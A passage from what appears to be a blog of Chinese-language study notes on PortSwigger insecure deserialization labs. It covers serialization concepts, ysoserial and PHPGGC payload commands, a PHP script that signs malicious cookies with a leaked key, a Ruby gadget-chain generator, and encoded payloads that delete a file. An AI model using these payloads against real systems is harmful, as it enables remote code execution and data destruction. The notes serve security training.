/home/carlos/morale.txt")&#125;&#125;'</span><span class="token punctuation">;</span><span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span><span class="token variable">$object</span><span class="token operator">-></span><span class="token property">template_file_path</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span></code></pre></li><li><p>Create a <code>PHAR-JPG</code> polyglot containing your PHPscript.</p></li><li><p>upload avatar</p></li><li><p>request:<code>GET /cgi-bin/avatar.php?avatar=phar://wiener</code><imgsrc="https://s2.loli.net/2023/08/18/IP1Adun2mEcgzoY.png"alt="image-20230818190937840" /></p></li></ol><h3 id="insecure-deserialization2023-06-24">Insecuredeserialization（2023-06-24）</h3><ul><li><p><strong>序列化</strong>是将复杂的数据结构，如对象及其字段，转换为可以作为连续字节流发送和接收的“扁平”格式的过程。序列化数据使得以下操作更加简单：</p><p>将复杂数据写入进程间内存、文件或数据库发送复杂数据，例如通过网络，在应用程序的不同组件之间传递数据，或在API调用中传递数据重要的是，在序列化对象时，对象的状态也被持久化。换句话说，对象的属性以及其分配的值都被保留下来。</p></li><li><p><strong>反序列化</strong>是将字节流恢复为与原始对象完全相同状态的完全功能副本的过程。网站的逻辑可以与这个反序列化的对象进行交互，就像与任何其他对象一样。许多编程语言都提供对序列化的原生支持。对象的序列化方式<strong>取决于</strong>具体的编程语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，可读性也不同。需要注意的是，原始对象的所有属性都存储在序列化的数据流中，包括任何私有字段。要防止字段被序列化，必须在类声明中显式标记为“transient”。</p><p>请注意，在使用不同的编程语言时，序列化可能被称为<code>marshalling（Ruby）或pickling（Python）</code>。这些术语在这个上下文中与“序列化”是同义词。</p></li><li><p><strong>不安全的反序列化</strong>是指网站对<strong>用户可控数据</strong>进行反序列化的情况。这可能使攻击者能够<strong>操纵序列化对象</strong>，将有害数据传递到应用程序代码中。</p><p>甚至可以用完全<strong>不同的类</strong>替换序列化对象。令人担忧的是，无论期望的是哪个类，任何可供网站使用的类的对象都将被反序列化和实例化。因此，不安全的反序列化有时也被称为“对象注入”漏洞。</p><p>意外的类的对象可能会引发异常。然而，此时可能已经造成了损害。许多基于反序列化的攻击在<strong>反序列化完成之前</strong>就已经完成。这意味着即使网站的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，基于<strong>强类型语言</strong>的逻辑的网站也可能容易受到这些技术的攻击。</p></li><li><p>讨论话题</p><ul><li>How to identify insecure deserialization LABS</li><li>Modifying serialized objects that are expected by the websiteLABS</li><li>Passing malicious data into dangerous website functionalityLABS</li><li>Injecting arbitrary object types LABS</li><li>Chaining method invocations to control the flow of data intodangerous sink gadgets LABS</li><li>Manually creating your own advanced exploits LABS</li><li>PHAR deserialization LABS</li></ul></li></ul><h4 id="exploiting-insecure-deserialization-vulnerabilities">Exploitinginsecure deserialization vulnerabilities</h4><ul><li>PHP serialization are <code>serialize()</code> and<code>unserialize()</code></li><li>Java等一些语言使用<strong>二进制序列化格式</strong><ul><li>Java序列化的对象总是以<strong>相同的字节</strong>开头，这些字节在十六进制中被编码为<code>ac ed</code>，而在Base64中则被编码为<code>rO0</code></li><li>Any class that implements the interface<code>java.io.Serializable</code> can be serialized and deserialized. Ifyou have source code access, take note of any code that uses the<code>readObject()</code> method, which is used to read and deserializedata from an <code>InputStream</code>.</li><li>write a short script in the corresponding language to create andserialize the new object yourself.</li></ul></li></ul><h5 id="lab-modifying-serialized-objects-1">Lab: Modifying serializedobjects</h5><ul><li>value</li></ul><ol type="1"><li><p>发现issue<imgsrc="https://s2.loli.net/2023/07/04/muENrzW9qLADTaP.png"alt="image-20230704035501907" /></p></li><li><p>将对象中 <code>admin</code>后面的 <code>b:0</code>改为<code>b:1</code>--&gt; apply changes。<strong>inspector功能</strong><imgsrc="https://s2.loli.net/2023/07/04/Gn7gqtHZhD1Ya8z.png"alt="image-20230704035715674" /></p></li><li><p>复制修改后的cookie到网站粘贴<imgsrc="https://s2.loli.net/2023/07/04/MHfjY12SQy63Kwm.png"alt="image-20230704035925695" /></p></li></ol><ul><li><p>php弱比较：<code>5 == "5 of something"</code>is in practicetreated as <code>5 == 5</code>.</p><p>This becomes even stranger when comparing a string the integer<code>0</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token number">0</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"Example string"</span> <span class="token comment">// true</span></code></pre></li></ul><h5 id="lab-modifying-serialized-data-types-1">Lab: Modifying serializeddata types</h5><ul><li>几乎同上</li><li>关键在于<ol type="1"><li>username 长度</li><li>access_token<strong>值</strong>的数据类型改为整型<imgsrc="https://s2.loli.net/2023/07/04/5DupxWhoAqVZrXS.png"alt="image-20230704070053997" /></li></ol></li></ul><h5id="lab-using-application-functionality-to-exploit-insecure-deserialization-1">Lab:Using application functionality to exploit insecure deserialization</h5><ol type="1"><li>在删除账户功能的请求中发现在cookie中，对象存在一个属性指向一个路径文件，将其修改为victim目录下的文件。<imgsrc="https://s2.loli.net/2023/07/04/y8eBI6jiC3Pmw4H.png"alt="image-20230704085144103" /></li></ol><h5 id="lab-arbitrary-object-injection-in-php-1">Lab: Arbitrary objectinjection in PHP</h5><ol type="1"><li><p>发现引用了一个模板文件 <code>CustomTemplate.php</code><imgsrc="https://s2.loli.net/2023/07/04/GAJcP74hkN5uOwV.png"alt="image-20230704180228981" /></p></li><li><p>加上波浪线 <code>~</code> 查看这个文件<imgsrc="https://s2.loli.net/2023/07/04/KkE9x27Qd3MmGfH.png"alt="image-20230704180330863" /></p><p>注意到 <code>__destruct</code>方法，发现存在<strong>反序列漏洞</strong></p></li><li><p>构造对象，触发unlink函数<imgsrc="https://s2.loli.net/2023/07/04/TFiz47vqkODcXyN.png"alt="image-20230704180519982" /></p></li></ol><h5 id="exploiting-java-deserialization-with-apache-commons">ExploitingJava deserialization with Apache Commons</h5><ul><li><p><strong>前置</strong></p><p><code>Gadget chain（组件链）</code>是指由多个漏洞利用组件（gadget）链接在一起的序列化对象，用于在不安全的反序列化漏洞中执行恶意操作。漏洞利用组件是指应用程序中存在的可以<strong>协同工作以达到特定目标的代码片段</strong>。</p><p>在不安全的反序列化漏洞中，攻击者可以通过构建特定的gadgetchain来实现攻击目的。这些组件链通常由序列化对象的序列化表示和触发特定操作的方法调用序列组成。攻击者利用应用程序在反序列化过程中自动调用这些方法的特性，通过传递特制的序列化数据来触发恶意操作。</p><p>一个gadget chain的成功利用通常需要满足以下<strong>条件</strong>：</p><ol type="1"><li>应用程序必须存在反序列化漏洞，允许攻击者传递自定义的序列化数据。</li><li>应用程序中必须存在可被利用的代码片段，即漏洞利用组件。</li><li>漏洞利用组件必须能够通过序列化对象的方法调用序列实现攻击目标，例如执行远程命令、获取敏感数据等。</li></ol><p>常见的gadgetchain包括在Java中使用的<code>Apache Commons Collections库</code>、<code>Java Native Serialization</code>库，以及在其他语言中使用的类似的库。这些库中的特定类和方法调用序列可以被组合成漏洞利用组件链，用于实现各种攻击。</p><p>值得注意的是，gadgetchain<strong>不是</strong>由攻击者构造的一系列方法调用，而是已经存在于应用程序中的代码。攻击者所控制的只是传递给gadgetchain的<strong>数据</strong>。因此，了解和构建gadgetchain是成功利用不安全的反序列化漏洞的关键要素之一。攻击者需要研究目标应用程序中的可用类和方法，找到适合的gadgetchain来达到自己的攻击目的。</p></li><li><p>在使用ysoserial工具时，并非所有的gadgetchain都能用于运行任意代码。相反，它们可能用于其他目的。例如，以下几个gadgetchain可以帮助您快速检测几乎任何服务器上的不安全反序列化：</p><ol type="1"><li><code>URLDNS</code>链触发对提供的URL的DNS查询。最重要的是，它不依赖于目标应用程序使用特定的易受攻击的库，并且适用于任何已知的Java版本。这使得它成为用于检测目的的最通用的gadgetchain。如果您在流量中发现了一个序列化对象，您可以尝试使用这个gadgetchain生成一个对象，触发与BurpCollaborator服务器的DNS交互。如果成功触发了DNS交互，您可以确定在目标上进行了反序列化。</li><li><code>JRMPClient</code>是另一个用于初步检测的通用gadgetchain。它会导致服务器尝试与提供的IP地址建立TCP连接。请注意，您需要提供一个原始的IP地址而不是主机名。在所有出站流量（包括DNS查询）都被防火墙阻止的环境中，这个gadgetchain可能很有用。您可以尝试生成两个不同IP地址的负载：一个是本地IP地址，一个是被防火墙阻止的外部IP地址。如果应用程序对带有本地地址的负载立即响应，但对带有外部地址的负载出现延迟，导致响应的时间差异，那就表明gadgetchain生效了，因为服务器尝试连接到了被防火墙阻止的地址。在这种情况下，响应的微小时间差异可以帮助您检测服务器是否发生反序列化，即使在盲目情况下也能够做到这一点。</li></ol></li></ul><ol type="1"><li><p><ahref="https://github.com/frohoff/ysoserial">java反序列化工具ysoserial</a></p></li><li><p>jdk17 报错,切换成更低版本，因为版本17安全性更高</p><pre class="language-zsh" data-language="zsh"><code class="language-zsh">┌──(jf710001011㉿Jf7Windows)-[~&#x2F;MyFiles]└─$ java -jar ysoserial-all.jar CommonsCollections4 &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64Error while generating or serializing payloadjava.lang.IllegalAccessError: class ysoserial.payloads.util.Gadgets (in unnamed module @0x20d58ebb) cannot access class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.trax to unnamed module @0x20d58ebb        at ysoserial.payloads.util.Gadgets.createTemplatesImpl(Gadgets.java:102)        at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:32)        at ysoserial.payloads.CommonsCollections4.getObject(CommonsCollections4.java:26)        at ysoserial.GeneratePayload.main(GeneratePayload.java:34)</code></pre></li><li><p>登录账号，burp发现反序列化漏洞，使用<code>ysoserial</code></p><p>其中一个用于 Java 反序列化的工具是"ysoserial"。它允许您选择一个您认为目标应用程序正在使用的库中提供的gadget chain，然后传入一个您想要执行的命令。它会根据所选的 chain创建相应的序列化对象。虽然这仍然需要一定的试错，但比手动构建自己的gadget chains 要节省大量的时间和精力</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1</span><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar CommonsCollections4 <span class="token string">'rm /home/carlos/morale.txt'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> cookieToUse.txt<span class="token comment">#2</span><span class="token function">cat</span> cookieToUse.txt这条命令使用了ysoserial-all.jar工具来生成一个基于CommonsCollections4库的攻击载荷，并将其输出进行了Base64编码后保存到文件cookieToUse.txt中。<span class="token number">1</span>. <span class="token variable"><span class="token variable">`</span><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-all.jar<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是使用Java运行ysoserial-all.jar工具的命令。ysoserial-all.jar是一个包含了多个攻击载荷的工具，可以一次性生成多种类型的攻击载荷。<span class="token number">2</span>. <span class="token variable"><span class="token variable">`</span>CommonsCollections4<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是指定要使用的攻击载荷类型。在这种情况下，选择了CommonsCollections4库。<span class="token number">3</span>. <span class="token variable"><span class="token variable">`</span>'rm /home/carlos/morale.txt'<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是要执行的命令，即删除<span class="token variable"><span class="token variable">`</span>/home/carlos/morale.txt<span class="token variable">`</span></span>文件。您可以将此命令替换为任何您想在目标系统上执行的有效命令。<span class="token number">4</span>. <span class="token variable"><span class="token variable">`</span><span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span><span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是将前面生成的攻击载荷输出进行Base64编码的管道操作符，并且使用<span class="token variable"><span class="token variable">`</span><span class="token parameter variable">-w</span> <span class="token number">0</span><span class="token variable">`</span></span>参数指定不换行输出。<span class="token number">5</span>. <span class="token variable"><span class="token variable">`</span><span class="token operator">></span> cookieToUse.txt<span class="token variable">`</span></span><span class="token builtin class-name">:</span> 这是将Base64编码的攻击载荷输出重定向到文件cookieToUse.txt中。</code></pre></li><li><p>替换burp拦截的cookie，并url编码<imgsrc="https://s2.loli.net/2023/07/06/qjSxlp95JoK3ei8.png"alt="image-20230706220331638" /></p></li></ol><h5id="lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain-1">Lab:Exploiting PHP deserialization with a pre-built gadget chain</h5><ul><li><p><strong>前置</strong></p><ul><li><p><code>PHP Generic Gadget Chains</code>（PHP通用gadget链）是针对PHP语言的一种工具，用于利用不安全的反序列化漏洞。这个工具的目的是生成一系列漏洞利用组件链，用于构造恶意的序列化数据，以实现特定的攻击目标。</p><p>PHPGGC的工作原理是通过分析目标应用<strong>程序的源代码和依赖的库</strong>，识别出其中可能存在的可利用的gadgetchain。然后，它根据这些gadgetchain自动生成相应的序列化数据，供攻击者使用。</p><p>PHPGGC支持的攻击类型包括<strong>远程代码执行、文件删除、命令执行</strong>等。它提供了一系列预定义的gadgetchain，攻击者可以根据需要选择适合的链条来构造恶意的序列化数据。</p><p>使用PHPGGC可以简化利用不安全的反序列化漏洞的过程，攻击者无需手动构造复杂的序列化数据，而是可以直接使用<strong>预先生成的gadgetchain</strong>。这使得利用漏洞变得更加容易和快速。</p><p>需要注意的是，PHPGGC只是一种工具，攻击者仍然需要对目标应用程序进行仔细分析和测试，以确定适合的gadgetchain和攻击方式。此外，使用PHPGGC进行攻击仍然需要对目标应用程序的漏洞进行评估和权限获取。</p></li><li><p>在该实验中，<code>令牌（token）</code>是指包含序列化的PHP对象的数据，用于在会话cookie中传递。令牌本身是未经签名的数据。</p><p><code>签名</code>是为了确保令牌的完整性和身份验证。在该实验中，使用了SHA-1HMAC哈希算法对令牌进行签名，使用一个密钥来生成数字签名。</p><p>数字签名是通过将令牌与密钥进行哈希计算而生成的。计算过程使用了HMAC算法，其中密钥用于对令牌进行加密哈希。生成的数字签名被添加到令牌中作为签名字段。</p><p>验证签名时，服务器会使用相同的密钥和哈希算法对令牌进行计算，并将计算得到的签名与令牌中的签名字段进行比较。如果两者匹配，说明令牌的完整性得到了验证，没有被篡改过。</p></li></ul></li></ul><ol type="1"><li><p>Cookie中包含序列化对象，<strong>token</strong>值<imgsrc="https://s2.loli.net/2023/07/07/cxHzYS8EVFuvqOw.png"alt="image-20230707034215153" /></p></li><li><p>更改其中的<code>username</code>为carlos,报错<imgsrc="https://s2.loli.net/2023/07/07/AwbzOhyLsDG3tuo.png"alt="image-20230707034357474" /></p><p><strong>报错分析</strong>：后端使用了php的Symfony4.3.6框架，此框架存在<code>RCE（Remote Code Execution，远程代码执行）gadget链</code></p></li><li><p>同时注意到资产下的这个文件，请求这个文件<imgsrc="https://s2.loli.net/2023/07/07/jDEegGfAlr3dkXR.png"alt="image-20230707034641845" /></p><p>注意到一个<strong>私钥变量</strong><imgsrc="https://s2.loli.net/2023/07/07/GQcIsxEV5an9ekz.png"alt="image-20230707034740601" /></p></li><li><p><a href="https://github.com/ambionics/phpggc">phpggc工具</a></p><p>使用PHPGGC生成对象是为了<strong>利用</strong>Symfony框架中的远程代码执行（RCE）漏洞。PHPGGC是一个工具，它可以<strong>生成</strong>包含特定漏洞利用链的恶意序列化对象。通过使用PHPGGC生成的对象，我们可以利用Symfony框架的漏洞来执行任意的命令或操作。</p><p>在这种情况下，通过生成特定的恶意序列化对象，我们可以构造一个包含远程代码执行的利用链，以删除Carlos的morale.txt文件。由于漏洞的存在，当目标网站对包含恶意对象的请求进行反序列化时，恶意代码将被执行，从而导致目标文件被删除。</p><p>通过使用PHPGGC生成恶意对象，我们能够利用现有的漏洞利用链，而无需手动构造复杂的序列化数据。这简化了利用过程，并提供了一种快速且可靠的方式来利用特定的漏洞。</p><pre class="language-zsh" data-language="zsh"><code class="language-zsh">git clone https:&#x2F;&#x2F;github.com&#x2F;ambionics&#x2F;phpggc.git</code></pre></li><li><p>使用phpggc</p><pre class="language-zsh" data-language="zsh"><code class="language-zsh">.&#x2F;phpggc Symfony&#x2F;RCE4 exec &#39;rm &#x2F;home&#x2F;carlos&#x2F;morale.txt&#39; | base64 -w 0 &gt; CookieSymfonyRCE4.txt</code></pre><p>结果<img src="https://s2.loli.net/2023/07/07/Us45TB8RmctlMQw.png"alt="结果" /></p></li><li><p>构造一个有效的、经过签名的Cookie</p><pre class="language-php" data-language="php"><code class="language-php"># 脚本<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"OBJECT-GENERATED-BY-PHPGGC"</span><span class="token punctuation">;</span><span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP"</span><span class="token punctuation">;</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span><span class="token comment">#套用</span><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg=="</span><span class="token punctuation">;</span><span class="token variable">$secretKey</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"6jo0phdc8u0sc4pepgxpg1q3o0ouz7r5"</span><span class="token punctuation">;</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;"token":"'</span> <span class="token operator">.</span> <span class="token variable">$object</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'","sig_hmac_sha1":"'</span> <span class="token operator">.</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha1'</span><span class="token punctuation">,</span> <span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$secretKey</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$cookie</span><span class="token punctuation">;</span></span></code></pre><p><strong>脚本分析</strong>：</p><p>这段PHP代码用于构造一个有效的、经过签名的Cookie，其中包含了利用不安全的反序列化漏洞的恶意对象：</p><ul><li><code>$object = "OBJECT-GENERATED-BY-PHPGGC";</code>：这行代码指定了通过PHPGGC工具生成的恶意对象的字符串表示。实际应用中，你需要将这部分替换为真正的恶意对象的字符串表示。</li><li><code>$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";</code>：这行代码指定了从phpinfo.php文件中泄露的秘密密钥，用于对Cookie进行签名。实际应用中，你需要将这部分替换为从phpinfo.php中获取的实际秘密密钥。</li><li><code>$cookie = urlencode('&#123;"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"&#125;');</code>：这行代码构造了一个包含恶意对象和签名的Cookie字符串。使用<code>urlencode()</code>函数对整个字符串进行URL编码，以确保其中的特殊字符被正确处理。</li><li><code>echo $cookie;</code>：这行代码将构造的Cookie字符串输出到控制台。</li></ul></li><li><p>将结果替代原来的cookie</p></li></ol><h5id="lab-exploiting-ruby-deserialization-using-a-documented-gadget-chain-1">Lab:Exploiting Ruby deserialization using a documented gadget chain</h5><ol type="1"><li><p><ahref="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">ruby反序列化博客</a></p></li><li><p><a href="https://www.onlinegdb.com/">在线工具onlinegdb</a></p><pre class="language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Autoload the required classes</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcherGem<span class="token double-colon punctuation">::</span>Installer<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'base64'</span></span>  <span class="token comment">#缺少则报错：main.rb:38:in `&lt;main>': uninitialized constant Base64 (NameError)</span><span class="token comment"># prevent the payload from running when we Marshal.dump it</span><span class="token keyword">module</span> <span class="token class-name">Gem</span>  <span class="token keyword">class</span> <span class="token class-name">Requirement</span>    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">marshal_dump</span></span>      <span class="token punctuation">[</span><span class="token variable">@requirements</span><span class="token punctuation">]</span>    <span class="token keyword">end</span>  <span class="token keyword">end</span><span class="token keyword">end</span>wa1 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>Kernel<span class="token punctuation">,</span> <span class="token symbol">:system</span><span class="token punctuation">)</span>rs <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>RequestSet<span class="token punctuation">.</span>allocaters<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@sets'</span></span><span class="token punctuation">,</span> wa1<span class="token punctuation">)</span>rs<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@git_set'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"rm /home/carlos/morale.txt"</span></span><span class="token punctuation">)</span>wa2 <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span><span class="token class-name">WriteAdapter</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span>rs<span class="token punctuation">,</span> <span class="token symbol">:resolve</span><span class="token punctuation">)</span>i <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token double-colon punctuation">::</span>Entry<span class="token punctuation">.</span>allocatei<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@read'</span></span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>i<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@header'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"aaa"</span></span><span class="token punctuation">)</span>n <span class="token operator">=</span> Net<span class="token double-colon punctuation">::</span>BufferedIO<span class="token punctuation">.</span>allocaten<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>n<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@debug_output'</span></span><span class="token punctuation">,</span> wa2<span class="token punctuation">)</span>t <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Package<span class="token double-colon punctuation">::</span>TarReader<span class="token punctuation">.</span>allocatet<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@io'</span></span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>r <span class="token operator">=</span> Gem<span class="token double-colon punctuation">::</span>Requirement<span class="token punctuation">.</span>allocater<span class="token punctuation">.</span>instance_variable_set<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'@requirements'</span></span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>payload <span class="token operator">=</span> Marshal<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">[</span>Gem<span class="token double-colon punctuation">::</span>SpecFetcher<span class="token punctuation">,</span> Gem<span class="token double-colon punctuation">::</span>Installer<span class="token punctuation">,</span> r<span class="token punctuation">]</span><span class="token punctuation">)</span>puts Base64<span class="token punctuation">.</span>encode64<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre></li><li><p>结果整理</p><pre class="language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token builtin class-name">echo</span> <span class="token string">"ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ=="</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span><span class="token assign-left variable">ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ</span><span class="token operator">==</span><span class="token comment"># 解析</span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span><span class="token variable"><span class="token variable">`</span> 是一个 Linux 命令，用于从文本中删除换行符和回车符。- <span class="token variable">`</span></span><span class="token function">tr</span><span class="token variable"><span class="token variable">`</span> 是 <span class="token variable">`</span></span>translate<span class="token variable"><span class="token variable">`</span> 的缩写，用于转换或删除字符。- <span class="token variable">`</span></span>-d<span class="token variable"><span class="token variable">`</span> 是 <span class="token variable">`</span></span>delete<span class="token variable"><span class="token variable">`</span> 的缩写，表示删除指定的字符。- <span class="token variable">`</span></span><span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span><span class="token variable"><span class="token variable">`</span> 是要删除的字符集。<span class="token variable">`</span></span><span class="token punctuation">\</span>n<span class="token variable"><span class="token variable">`</span> 表示换行符，<span class="token variable">`</span></span><span class="token punctuation">\</span>r<span class="token variable"><span class="token variable">`</span> 表示回车符。因此，<span class="token variable">`</span></span><span class="token function">tr</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span>"</span>` 命令会将输入的文本中的换行符和回车符删除，并输出删除后的文本。这个命令在处理文本文件时常用，可以去除多余的换行符和回车符，使文本更加整洁。</code></pre></li></ol><h5id="lab-developing-a-custom-gadget-chain-for-java-deserialization-1">Lab:Developing a custom gadget chain for Java deserialization</h5><ol type="1"><li><p>Cookie中包含序列化对象</p></li><li><p>发现 <code>/backup/</code>文件夹<imgsrc="https://s2.loli.net/2023/07/07/wRYP2vfm3WIQEcd.png"alt="image-20230707232819755" /></p><p>查看ProducrTemplate.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">data<span class="token punctuation">.</span>productcatalog</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">common<span class="token punctuation">.</span>db<span class="token punctuation">.</span></span><span class="token class-name">JdbcConnectionBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token 